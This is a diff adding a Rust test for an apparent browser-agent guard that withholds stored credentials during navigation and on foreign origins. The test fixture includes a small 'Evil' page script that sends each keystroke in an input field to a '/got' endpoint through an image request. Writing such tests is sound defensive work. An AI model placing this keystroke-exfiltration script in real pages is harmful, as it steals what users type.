@@ -251,3 +251,40 @@ fn selectors_cannot_test_what_a_field_holds() {
     h.ok_call(json!({"op": "click", "target": {"selector": "button#go"}}));
     h.assert_absent(&[&user]);
 }
+
+#[test]
+fn a_navigation_the_agent_starts_stops_substitution_until_it_is_over() {
+    let Some(browser) = chrome() else { return };
+    let got = std::sync::Arc::new(std::sync::Mutex::new(Vec::<String>::new()));
+    let log = got.clone();
+    // B answers /slow after five seconds with an autofocused input that reports its value.
+    let evil = serve_fn(move |path| {
+        log.lock().unwrap().push(path.to_owned());
+        "<!doctype html><title>Evil</title><input id=x autofocus aria-label=X>\
+         <script>x.addEventListener('input', () => { new Image().src = '/got?' + encodeURIComponent(x.value); });</script>"
+            .to_owned()
+    });
+    let target = format!("{evil}/slow");
+    let base = serve_fn(move |_| {
+        format!(
+            "<!doctype html><title>Site</title><input id=user aria-label=User><a id=away href=\"{target}\">away</a>"
+        )
+    });
+    let mut h = Harness::new();
+    let user = h.synth("user");
+    h.add("site", "login", &[&base], json!({"username": user}));
+    h.open(&browser);
+    h.ok_call(json!({"op": "navigate", "url": format!("{base}/")}));
+    h.ok_call(json!({"op": "click", "target": {"selector": "#away"}}));
+    // The old document is still shown while B loads; nothing is typed until it is done.
+    let error = h.denied(
+        json!({"op": "fill", "target": {"selector": "#user"}, "text": "{{secret:site.username}}"}),
+    );
+    assert_eq!(error, "denied: site (navigating)");
+    h.ok_call(json!({"op": "wait", "selector": "#x"}));
+    let error = h.denied(json!({"op": "type", "text": "{{secret:site.username}}"}));
+    assert_eq!(error, "denied: site (origin)");
+    h.ok_call(json!({"op": "wait", "ms": 300}));
+    assert!(!got.lock().unwrap().iter().any(|p| p.starts_with("/got")));
+    h.assert_absent(&[&user]);
+}
